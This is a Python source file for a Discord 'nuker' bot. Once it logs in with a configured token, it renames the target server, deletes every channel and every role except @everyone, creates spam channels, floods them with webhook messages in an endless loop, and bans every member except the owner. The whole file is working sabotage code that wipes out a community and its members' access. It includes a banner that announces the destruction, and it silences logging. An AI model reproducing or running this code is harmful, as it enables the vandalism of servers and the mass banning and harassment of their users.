import discord
import aiohttp
import asyncio
import json
import logging
import os


os.environ['JISHAKU_HIDE'] = 'True'
os.environ['JISHAKU_NO_UNDERSCORE'] = 'True'
logging.basicConfig(level=logging.CRITICAL)
logging.getLogger("discord").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)


def print_banner():
    green = "\033[92m"  # Green color
    reset = "\033[0m"   # Reset color
    banner = f"""{green}
=====================================================


          R O S T E R 



   
=====================================================
               ROSTU NUKER
=====================================================
      [+] Deleting all channels...
      [+] Deleting all roles...
      [+] Changing server name...
      [+] Creating spam channels...
      [+] Spamming messages...
      [+] Mass banning members...
=====================================================
{reset}"""  # Reset color at end
    print(banner)


with open("config.json", "r") as f:
    config = json.load(f)

TOKEN = config["TOKEN"]
GUILD_ID = config["GUILD_ID"]
CHANNEL_NAME = config["CHANNEL_NAME"]
WEBHOOK_MESSAGE = config["WEBHOOK_MESSAGE"]
SPAM_SPEED = config["SPAM_SPEED"]
CHANNEL_BATCH = config["CHANNEL_BATCH"]

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.guild_messages = True
intents.message_content = True
client = discord.Client(intents=intents)

async def delete_all_channels(guild):
    print("[!] Deleting all channels...")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"[✓] Deleted channel: {channel.name}")
        except Exception as e:
            print(f"[X] Failed to delete {channel.name}: {e}")

async def delete_all_roles(guild):
    print("[!] Deleting all roles...")
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"[✓] Deleted role: {role.name}")
            except Exception as e:
                print(f"[X] Failed to delete {role.name}: {e}")

async def mass_ban(guild):
    print("[!] Banning all members...")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.ban(reason="Server Nuked")
                print(f"[✓] Banned {member.name}")
            except Exception as e:
                print(f"[X] Failed to ban {member.name}: {e}")

async def create_and_spam_channels(guild):
    print("[!] Creating spam channels...")
    for _ in range(CHANNEL_BATCH):
        channel = await guild.create_text_channel(CHANNEL_NAME)
        asyncio.create_task(spam_webhook(channel))  
    print("[✓] All spam channels created.")

async def spam_webhook(channel):
    webhook = await channel.create_webhook(name="Nuker")
    async with aiohttp.ClientSession() as session:
        while True:
            await session.post(webhook.url, json={"content": WEBHOOK_MESSAGE})
            await asyncio.sleep(SPAM_SPEED)

@client.event
async def on_ready():
    print_banner()
    print(f"[✓] Logged in as {client.user}")
    guild = client.get_guild(GUILD_ID)

    if guild:
        print("[!] Changing server name...")
        await guild.edit(name="Nuked Server")  
        await delete_all_channels(guild)  
        await delete_all_roles(guild)  
        await create_and_spam_channels(guild)  
        await mass_ban(guild)  
        print("[✓] Nuke Complete!")
    else:
        print("[X] Guild not found!")

client.run(TOKEN)